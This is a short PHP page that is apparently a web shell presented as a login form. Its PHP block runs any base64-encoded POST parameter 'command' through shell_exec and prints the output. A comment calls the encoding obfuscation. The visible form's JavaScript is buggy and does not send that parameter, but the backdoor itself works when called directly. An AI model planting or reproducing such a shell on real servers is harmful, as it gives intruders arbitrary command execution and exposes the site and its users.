<?php
	if (isset($_POST['command']))
	{
		// Minor obfuscation
		$response = shell_exec(base64_decode($_POST['command']));
	}
?>
<!DOCTYPE html>
<html>
	<head>
		<script>
		function validate(contents) {
			console.log("Contents passed as "+contents)
			console.log(document.getElementById('user').value);
			document.getElementById('user').value=btoa("document.getElementById('user').value");
			console.log(document.getElementById('user').value);
		}
		</script>
		<title>Shell</title>
	</head>
	<body>
		<form action="" method="POST" onsubmit="validate(document.getElementById('user').value)">
			<input type="text" name="user" id="user" />
			<input type="submit" value="Login"/>
		</form>
		<p>
			<?php 
				if (isset($response)) 
				{
					echo nl2br($response);
				}
			?>
		</p>
	</body>
</html>
